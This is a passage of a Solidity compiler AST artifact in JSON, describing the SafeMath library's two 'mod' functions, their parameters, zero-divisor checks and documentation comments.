												"visibility": "internal"
											}
										],
										"src": "3725:50:2"
									},
									"returnParameters": {
										"id": 254,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 253,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 271,
												"src": "3799:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 252,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3799:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3798:9:2"
									},
									"scope": 313,
									"src": "3713:272:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 287,
										"nodeType": "Block",
										"src": "4503:61:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 282,
															"name": "a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 274,
															"src": "4524:1:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 283,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 276,
															"src": "4527:1:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206d6f64756c6f206279207a65726f",
															"id": 284,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4530:26:2",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_726e51f7b81fce0a68f5f214f445e275313b20b1633f08ce954ee39abf8d7832",
																"typeString": "literal_string \"SafeMath: modulo by zero\""
															},
															"value": "SafeMath: modulo by zero"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_stringliteral_726e51f7b81fce0a68f5f214f445e275313b20b1633f08ce954ee39abf8d7832",
																"typeString": "literal_string \"SafeMath: modulo by zero\""
															}
														],
														"id": 281,
														"name": "mod",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															288,
															312
														],
														"referencedDeclaration": 312,
														"src": "4520:3:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$_t_string_memory_ptr_$returns$_t_uint256_$",
															"typeString": "function (uint256,uint256,string memory) pure returns (uint256)"
														}
													},
													"id": 285,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4520:37:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 280,
												"id": 286,
												"nodeType": "Return",
												"src": "4513:44:2"
											}
										]
									},
									"documentation": {
										"id": 272,
										"nodeType": "StructuredDocumentation",
										"src": "3991:440:2",
										"text": " @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n Reverts when dividing by zero.\n Counterpart to Solidity's `%` operator. This function uses a `revert`\n opcode (which leaves remaining gas untouched) while Solidity uses an\n invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 288,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mod",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 277,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 274,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 288,
												"src": "4449:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 273,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4449:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 276,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 288,
												"src": "4460:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 275,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4460:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4448:22:2"
									},
									"returnParameters": {
										"id": 280,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 279,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 288,
												"src": "4494:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 278,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4494:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4493:9:2"
									},
									"scope": 313,
									"src": "4436:128:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 311,
										"nodeType": "Block",
										"src": "5130:68:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 303,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 301,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 293,
																"src": "5148:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 302,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "5153:1:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "5148:6:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 304,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 295,
															"src": "5156:12:2",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 300,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "5140:7:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 305,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5140:29:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 306,
												"nodeType": "ExpressionStatement",
												"src": "5140:29:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 309,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 307,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 291,
														"src": "5186:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "%",
													"rightExpression": {
														"argumentTypes": null,
														"id": 308,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 293,
														"src": "5190:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5186:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 299,
												"id": 310,
												"nodeType": "Return",
												"src": "5179:12:2"
											}
										]
									},
									"documentation": {
										"id": 289,
										"nodeType": "StructuredDocumentation",
										"src": "4570:460:2",
										"text": " @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n Reverts with custom message when dividing by zero.\n Counterpart to Solidity's `%` operator. This function uses a `revert`\n opcode (which leaves remaining gas untouched) while Solidity uses an\n invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 312,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mod",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 296,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 291,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 312,
												"src": "5048:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 290,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5048:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 293,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 312,
												"src": "5059:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 292,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5059:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 295,
												"mutability": "mutable",
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 312,
												"src": "5070:26:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 294,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "5070:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5047:50:2"
									},
									"returnParameters": {
										"id": 299,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 298,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 312,
												"src": "5121:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 297,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5121:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5120:9:2"
									},
									"scope": 313,
									"src": "5035:163:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								}
							],
							"scope": 314,
							"src": "622:4578:2"
						}
					],
					"src": "33:5168:2"
				},
				"id": 2
			}
		}
	}
}